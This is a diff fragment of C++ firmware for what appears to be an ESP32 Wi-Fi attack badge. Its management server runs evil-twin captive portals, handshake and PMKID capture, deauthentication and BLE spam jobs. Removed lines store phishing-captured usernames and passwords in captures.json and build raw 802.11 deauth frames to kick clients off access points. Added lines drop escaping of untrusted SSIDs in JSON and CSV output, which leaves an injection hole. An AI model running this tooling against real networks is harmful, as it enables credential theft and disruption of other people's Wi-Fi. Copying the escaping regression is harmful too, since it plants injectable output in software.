-      String safe_ssid = mgmtJsonEscape(String(e->ssid));
-      String safe_auth = mgmtJsonEscape(String(e->auth));
+      String safe_ssid = String(e->ssid);
+      safe_ssid.replace("\"", "\\\"");
       buf += "{\"b\":\"" + String(e->bssid) + "\"";
       buf += ",\"s\":\"" + safe_ssid + "\"";
-      buf += ",\"a\":\"" + safe_auth + "\"";
+      buf += ",\"a\":\"" + String(e->auth) + "\"";
       buf += ",\"ch\":" + String(e->channel);
       buf += ",\"r\":" + String(e->rssi);
       buf += ",\"la\":" + String(e->lat, 7);
@@ -2271,8 +2103,11 @@ void EvilPortal::setupManagementServer() {
       return;
     }
     // Free AP scan results to reclaim heap before BLE init
+    // F-11 fix: LinkedList::clear() drops the nodes but never deletes each AP's
+    // stations/beacon LinkedLists, leaking ~5KB per 30-AP scan in the very path whose
+    // purpose is to free heap. clearAPs() is the proven correct teardown.
     if (access_points && access_points->size() > 0) {
-      access_points->clear();
+      wifi_scan_obj.clearAPs();
       Serial.printf("[MGMT] Freed AP scan results for BLE (%u B largest now)\n",
         (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
     }
@@ -2400,13 +2235,6 @@ void EvilPortal::setupManagementServer() {
       Serial.println("[MGMT] Management portal backed up");
     }
 
-    // Remove the gzipped management dashboard so mgmtServeFile won't
-    // prefer it over the evil template we're about to write.
-    if (SPIFFS.exists("/portal.html.gz")) {
-      SPIFFS.rename("/portal.html.gz", "/portal_mgmt.html.gz");
-      Serial.println("[MGMT] Stashed portal.html.gz as portal_mgmt.html.gz");
-    }
-
     // Write evil portal HTML as /portal.html so the captive handler serves it
     File f = SPIFFS.open("/portal.html", "w");
     f.print(html);
@@ -2424,48 +2252,19 @@ void EvilPortal::setupManagementServer() {
 
     // Tear down management
     server.stop();
-    this->dnsServer.stop();
     WiFi.softAPdisconnect(true);
-    delay(500);
-
-    // Start evil portal AP with explicit IP/DHCP (like management AP)
-    WiFi.mode(WIFI_AP);
-    delay(200);
-    IPAddress apIP(192, 168, 4, 1);
-    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(apName, "", ch);
     delay(300);
 
-    // Ensure DHCP server is running (phones fail to join without leases)
-    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (ap_netif) {
-      esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
-      esp_netif_dhcps_get_status(ap_netif, &st);
-      if (st != ESP_NETIF_DHCP_STARTED) {
-        esp_err_t err = esp_netif_dhcps_start(ap_netif);
-        Serial.printf("[MGMT] ET DHCP was %d, start -> %d\n", (int)st, (int)err);
-      }
-      esp_netif_dhcps_get_status(ap_netif, &st);
-      Serial.printf("[MGMT] ET AP dhcps=%s\n",
-                    st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF");
-    }
-
+    // Start evil portal AP directly (no need for ssids/access_points lists)
+    WiFi.mode(WIFI_AP);
+    delay(200);
+    WiFi.softAP(apName, "", ch);
     Serial.println("[MGMT] Evil Twin AP: " + String(apName) + " IP: " + WiFi.softAPIP().toString());
 
     // DNS wildcard for captive portal
     this->dnsServer.start(53, "*", WiFi.softAPIP());
 
-    // Clear management captive-portal routes that fake "internet is ok".
-    // WebServer keeps routes across stop()/begin() cycles; the management
-    // handlers (Success / 204) would shadow the evil-portal redirects.
-    // Must specify HTTP_GET — removeRoute(HTTP_ANY) won't match HTTP_GET handlers.
-    server.removeRoute("/hotspot-detect.html", HTTP_GET);
-    server.removeRoute("/library/test/success.html", HTTP_GET);
-    server.removeRoute("/generate_204", HTTP_GET);
-    server.removeRoute("/connecttest.txt", HTTP_GET);
-    server.removeRoute("/ncsi.txt", HTTP_GET);
-
-    // Now register evil-portal routes (302 redirect → /portal.html)
+    // Setup server with captive portal routes (setupServer includes /get handler)
     this->setupServer();
     server.begin();
     this->runServer = true;
@@ -2604,28 +2403,15 @@ void EvilPortal::setupManagementServer() {
     server.sendHeader("Content-Disposition", "attachment; filename=scan_results.csv");
     server.setContentLength(CONTENT_LENGTH_UNKNOWN);
     server.send(200, "text/csv", "");
-    // RFC4180 quoting helper (double-quotes inside fields doubled)
-    auto rfc4180_scan = [](const String &s) -> String {
-      String out = "\"";
-      for (unsigned i = 0; i < s.length(); i++) {
-        if (s[i] == '"') out += "\"\"";
-        else out += s[i];
-      }
-      out += "\"";
-      return out;
-    };
     server.sendContent("BSSID,SSID,Channel,RSSI,Selected\n");
+    char line[128];
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint ap = access_points->get(i);
-      char bssid[18];
-      snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+      snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d,%s\n",
                ap.bssid[0], ap.bssid[1], ap.bssid[2],
-               ap.bssid[3], ap.bssid[4], ap.bssid[5]);
-      String line = String(bssid) + "," +
-                    rfc4180_scan(ap.essid) + "," +
-                    String(ap.channel) + "," +
-                    String(ap.rssi) + "," +
-                    (ap.selected ? "yes" : "no") + "\n";
+               ap.bssid[3], ap.bssid[4], ap.bssid[5],
+               ap.essid.c_str(), ap.channel, ap.rssi,
+               ap.selected ? "yes" : "no");
       server.sendContent(line);
     }
     server.sendContent("");
@@ -2651,6 +2437,7 @@ void EvilPortal::setupManagementServer() {
     server.setContentLength(CONTENT_LENGTH_UNKNOWN);
     server.send(200, "text/csv", "");
     server.sendContent("BSSID,SSID,Channel,RSSI,Type,PMKID,Messages\n");
+    char line[128];
     for (int i = 0; i < hs_count; i++) {
       uint8_t m = hs_list[i].eapol_msgs;
       const char* t = "none";
@@ -2658,22 +2445,12 @@ void EvilPortal::setupManagementServer() {
       else if ((m & 0x03) == 0x03) t = "half";
       else if (hs_list[i].has_pmkid) t = "pmkid";
       else if (m > 0) t = "partial";
-      // RFC4180 quote the SSID
-      String safe_ssid = "\"";
-      for (const char* p = hs_list[i].ssid; *p; p++) {
-        if (*p == '"') safe_ssid += "\"\"";
-        else safe_ssid += *p;
-      }
-      safe_ssid += "\"";
-      char bssid[18];
-      snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+      snprintf(line, sizeof(line),
+               "%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d,%s,%s,0x%02X\n",
                hs_list[i].bssid[0], hs_list[i].bssid[1], hs_list[i].bssid[2],
-               hs_list[i].bssid[3], hs_list[i].bssid[4], hs_list[i].bssid[5]);
-      char tail[32];
-      snprintf(tail, sizeof(tail), "%d,%d,%s,%s,0x%02X",
-               hs_list[i].ch, hs_list[i].rssi, t,
-               hs_list[i].has_pmkid ? "yes" : "no", m);
-      String line = String(bssid) + "," + safe_ssid + "," + String(tail) + "\n";
+               hs_list[i].bssid[3], hs_list[i].bssid[4], hs_list[i].bssid[5],
+               hs_list[i].ssid, hs_list[i].ch, hs_list[i].rssi,
+               t, hs_list[i].has_pmkid ? "yes" : "no", m);
       server.sendContent(line);
     }
     server.sendContent("");
@@ -2759,13 +2536,12 @@ void EvilPortal::setupManagementServer() {
                        ",\"count\":" + String(probe_count) + ",\"probes\":[");
     char buf[160];
     for (int i = 0; i < probe_count; i++) {
-      String safe_ssid = mgmtJsonEscape(String(probe_list[i].ssid));
       snprintf(buf, sizeof(buf),
                "%s{\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid\":\"%s\",\"rssi\":%d,\"ago\":%lu}",
                i?",":"",
                probe_list[i].mac[0],probe_list[i].mac[1],probe_list[i].mac[2],
                probe_list[i].mac[3],probe_list[i].mac[4],probe_list[i].mac[5],
-               safe_ssid.c_str(), probe_list[i].rssi,
+               probe_list[i].ssid, probe_list[i].rssi,
                (millis()-probe_list[i].last_ms)/1000);
       server.sendContent(buf);
     }
@@ -2919,18 +2695,31 @@ void EvilPortal::mgmtServiceJob() {
     if (this->mgmt_job_kind == "scan-ap-direct") {
       int16_t n = WiFi.scanComplete();
       if (n == WIFI_SCAN_RUNNING) {
-        // still scanning; check timeout (max 25s safety)
-        if (now - this->mgmt_job_t0 > 25000UL) {
+        // still scanning; hard safety cap = time budget + 15s slack
+        if (now - this->mgmt_job_t0 > this->mgmt_job_duration_s * 1000UL + 15000UL) {
           Serial.println("[MGMT] scan timeout; cancelling");
           WiFi.scanDelete();
           this->mgmt_job_state = MGMT_JOB_IDLE;
           this->mgmt_job_kind  = "";
+          this->mgmt_job_duration_s = 0;
         }
         return; // not done yet
       }
       // scan done or failed
       if (n > 0) {
+        int added = 0;
         for (int i = 0; i < n; i++) {
+          uint8_t *bss = WiFi.BSSID(i);
+          // Cross-cycle dedup against the flat table (no struct copies)
+          bool dupe = false;
+          if (bss) {
+            for (uint8_t s = 0; s < this->mgmt_scan_seen_n; s++) {
+              if (memcmp(this->mgmt_scan_seen[s], bss, 6) == 0) { dupe = true; break; }
+            }
+          }
+          if (dupe) continue;
+          if (access_points->size() >= 64) break; // hard cap
+
           AccessPoint ap;
           ap.essid   = WiFi.SSID(i);
           if (ap.essid.length() == 0) ap.essid = WiFi.BSSIDstr(i);
@@ -2943,16 +2732,52 @@ void EvilPortal::mgmtServiceJob() {
           ap.wpsVulnerable = false;
           // H: Bug H — store encryption type for /api/aps auth field
           ap.encryptionType = (uint8_t)WiFi.encryptionType(i);
-          uint8_t *bssid = WiFi.BSSID(i);
-          if (bssid) memcpy(ap.bssid, bssid, 6);
-          else       memset(ap.bssid, 0, 6);
+          if (bss) memcpy(ap.bssid, bss, 6);
+          else     memset(ap.bssid, 0, 6);
           access_points->add(ap);
+          added++;
+          if (bss && this->mgmt_scan_seen_n < 64) {
+            memcpy(this->mgmt_scan_seen[this->mgmt_scan_seen_n], bss, 6);
+            this->mgmt_scan_seen_n++;
+          }
         }
-        Serial.println("[MGMT] scan done: " + String(n) + " APs");
+        Serial.printf("[MGMT] cycle: %d found, +%d new, %d total\n",
+                      (int)n, added, access_points->size());
       } else {
         Serial.println("[MGMT] scan done: 0 or error (" + String(n) + ")");
+        // First scan after softAP is active often returns 0 / WIFI_SCAN_FAILED
+        // because the radio is busy serving the AP. Retry exactly once.
+        // Guarded by mgmt_scan_retried, and still bounded by the timeout
+        // above since mgmt_job_t0 is NOT reset here.
+        if (!this->mgmt_scan_retried) {
+          this->mgmt_scan_retried = true;
+          Serial.println("[MGMT] empty scan; auto-retrying once");
+          WiFi.scanDelete();
+          WiFi.scanNetworks(true /*async*/, true /*show_hidden*/);
+          return; // stay in SCANNING; next poll picks up the retry
+        }
       }
-      WiFi.scanDelete();
+      WiFi.scanDelete(); // free the driver buffers before deciding anything
+
+      // Another cycle only if ALL THREE hold. Any one failing ends the scan,
+      // so this can neither run forever nor starve the heap:
+      //  1. the remaining time budget fits a whole cycle (~5s)
+      //  2. the AP table is below the hard cap
+      //  3. a healthy contiguous block is still available for the driver
+      uint32_t elapsedMs = now - this->mgmt_job_t0;
+      uint32_t budgetMs  = this->mgmt_job_duration_s * 1000UL;
+      size_t   largest   = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
+      if (budgetMs > elapsedMs + 5000UL &&
+          access_points->size() < 64 &&
+          largest > 40000) {
+        WiFi.scanNetworks(true /*async*/, true /*show_hidden*/);
+        return; // stay in SCANNING for the next cycle
+      }
+      if (largest <= 40000)
+        Serial.printf("[MGMT] stopping cycles: largest block %u\n", (unsigned)largest);
+
+      Serial.printf("[MGMT] scan finished: %d APs in %lus\n",
+                    access_points->size(), (unsigned long)(elapsedMs / 1000UL));
       this->mgmt_job_state = MGMT_JOB_IDLE;
       this->mgmt_job_kind  = "";
       this->mgmt_job_duration_s = 0;
@@ -2968,23 +2793,15 @@ void EvilPortal::mgmtServiceJob() {
       this->mgmt_job_t0    = now;
     }
   } else if (this->mgmt_job_state == MGMT_JOB_ATTACK) {
-    // Generic attack timer (deauth, beacon, probe, handshake, sniffer — NOT evil twin)
-    if (this->mgmt_job_kind != "eviltwin" &&
-        this->mgmt_job_duration_s > 0 &&
+    if (this->mgmt_job_duration_s > 0 &&
         now - this->mgmt_job_t0 >= this->mgmt_job_duration_s * 1000UL) {
       Serial.println("[MGMT] job timer expired (" + this->mgmt_job_kind +
                      "); stopscan + rearm");
-      // Clean up handshake capture if it was active
-      if (hs_active) {
-        esp_wifi_set_promiscuous(false);
-        hs_active = false;
-        Serial.printf("[MGMT] Handshake capture stopped: %u entries\n", (unsigned)hs_count);
-      }
       cli_obj.runCommand("stopscan");
-      // BLE jobs leave NimBLE resident on the C5 (deinit triggers a watchdog
-      // reset), permanently starving the heap so the re-armed AP can't accept
-      // clients. Reboot instead: restores full heap and clean management mode.
-      // Matches the operator model: timed BLE ends -> badge restarts to normal.
+      // A BLE job ran after the radio teardown, and NimBLE never gives its
+      // heap back on deinit — a re-armed AP would come up but fail to accept
+      // clients. Reboot instead: that restores the full heap and clean
+      // management mode. Operator model: timed BLE ends -> badge restarts.
       if (this->mgmt_job_kind.startsWith("blespam") ||
           this->mgmt_job_kind == "ble-scan") {
         Serial.println("[MGMT] BLE job finished; rebooting to restore full heap");
@@ -3007,52 +2824,14 @@ void EvilPortal::mgmtServiceJob() {
       this->mgmt_job_state = MGMT_JOB_REARM;
       this->mgmt_job_t0    = now;
     }
-    // Process evil twin captured credentials (main() is not called in mgmt mode)
-    if (this->mgmt_job_kind == "eviltwin" &&
-        this->name_received && this->password_received) {
-      this->name_received = false;
-      this->password_received = false;
-      Serial.println("[EP] Credential captured via evil twin:");
-      Serial.println("  user: " + this->user_name);
-      Serial.println("  pass: " + this->password);
-      // Save to captures.json (same logic as main())
-      {
-        static const size_t CAPTURES_MAX = 8192;
-        String existing = "";
-        if (SPIFFS.exists("/captures.json")) {
-          File rf = SPIFFS.open("/captures.json", "r");
-          existing = rf.readString();
-          rf.close();
-        }
-        if (existing.length() < 5) existing = "{\"captures\":[]}";
-        int pos = existing.lastIndexOf("]}");
-        if (pos > 0) {
-          String entry = "{\"user\":\"" + mgmtJsonEscape(this->user_name) +
-                         "\",\"pass\":\"" + mgmtJsonEscape(this->password) +
-                         "\",\"ap\":\"" + String(apName) +
-                         "\",\"t\":" + String(millis()/1000) + "}";
-          bool hasEntries = existing.indexOf("[{") > 0;
-          String updated = existing.substring(0, pos) +
-                          (hasEntries ? "," : "") + entry + "]}";
-          if (updated.length() <= CAPTURES_MAX) {
-            File wf = SPIFFS.open("/captures.json", "w");
-            if (wf) { wf.print(updated); wf.close(); }
-          }
-        }
-      }
-    }
   } else if (this->mgmt_job_state == MGMT_JOB_REARM) {
     if (now - this->mgmt_job_t0 >= 500) { // let stopscan settle the radio
-      // Remount SPIFFS if it was unmounted for BLE
-      if (!SPIFFS.begin(true))
-        Serial.println("[MGMT] WARNING: SPIFFS remount failed");
       this->rearmManagementAP();
       // If we came from evil twin, restart management server
       // (server.stop() was called; begin() starts it again)
       this->setupManagementServer();
       server.begin();
       Serial.println("[MGMT] Management server restarted after rearm");
-      this->management_active   = true;
       this->mgmt_job_state      = MGMT_JOB_IDLE;
       this->mgmt_job_kind       = "";
       this->mgmt_job_duration_s = 0;
@@ -3135,96 +2914,15 @@ void EvilPortal::startManagementPortal() {
 }
 
 void EvilPortal::mainManagement() {
-  // Service the web server on every loop() pass, independent of scan mode
+  // Serve HTTP only while the management AP is actually up.
   if (this->management_active) {
-    // Smart channel rotation during handshake capture
-    static uint32_t lastHsHop = 0;
-    static uint8_t hsIdx = 0;
-    static bool hsOnHome = true;
-    
-    if (hs_active) {
-      uint32_t now = millis();
-      if (hs_target_ch > 0) {
-        // TARGETED: mostly on target channel, visit AP ch briefly for mgmt
-        if (hsOnHome) {
-          if (now - lastHsHop > 500) {
-            lastHsHop = now;
-            esp_wifi_set_channel(hs_target_ch, WIFI_SECOND_CHAN_NONE);
-            hsOnHome = false;
-          }
-        } else {
-          if (now - lastHsHop > 3000) {
-            lastHsHop = now;
-            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-            hsOnHome = true;
-          }
-        }
-      } else if (hs_hop_count > 0) {
-        // PASSIVE: cycle through scanned channels
-        if (hsOnHome) {
-          if (now - lastHsHop > 1000) {
-            lastHsHop = now;
-            hsIdx = (hsIdx + 1) % hs_hop_count;
-            uint8_t nextCh = hs_hop_channels[hsIdx];
-            if (nextCh != 1) {
-              esp_wifi_set_channel(nextCh, WIFI_SECOND_CHAN_NONE);
-              Serial.printf("[HS-HOP] -> ch%u\n", nextCh);
-              // Send deauth to all APs on this channel
-              if (hs_deauth) {
-                for (int i = 0; i < hs_count; i++) {
-                  if (hs_list[i].ch == nextCh) {
-                    uint8_t deauth[26] = {
-                      0xC0, 0x00, 0x3A, 0x01,
-                      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                      0x00, 0x00, 0x07, 0x00
-                    };
-                    memcpy(&deauth[10], hs_list[i].bssid, 6);
-                    memcpy(&deauth[16], hs_list[i].bssid, 6);
-                    esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
-                  }
-                }
-              }
-              hsOnHome = false;
-            }
-          }
-        } else {
-          if (now - lastHsHop > 2000) {
-            lastHsHop = now;
-            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-            // Send deauth to APs on ch1 too
-            if (hs_deauth) {
-              for (int i = 0; i < hs_count; i++) {
-                if (hs_list[i].ch == 1) {
-                  uint8_t deauth[26] = {
-                    0xC0, 0x00, 0x3A, 0x01,
-                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00, 0x07, 0x00
-                  };
-                  memcpy(&deauth[10], hs_list[i].bssid, 6);
-                  memcpy(&deauth[16], hs_list[i].bssid, 6);
-                  esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
-                }
-              }
-            }
-            hsOnHome = true;
-          }
-        }
-      }
-    } else {
-      // Reset state when capture stops
-      hsOnHome = true;
-      hsIdx = 0;
-    }
-
     server.handleClient();
   }
-
-  // The job timer MUST run on every loop pass, even when the AP is torn down
-  // (BLE spam/scan sets management_active=false). Otherwise duration-limited
-  // BLE jobs would never auto-stop and re-arm the management AP.
+  // Advance the job state machine ALWAYS — never gate this on
+  // management_active. The BLE path tears the radio down and clears that flag
+  // on purpose, and the timed-BLE reboot lives inside mgmtServiceJob(): gating
+  // it here made timed BLE jobs run forever and left the badge unreachable
+  // until a manual RESET. Safe to call unconditionally because the function
+  // dispatches on mgmt_job_state and is a no-op while IDLE.
   this->mgmtServiceJob();
 }
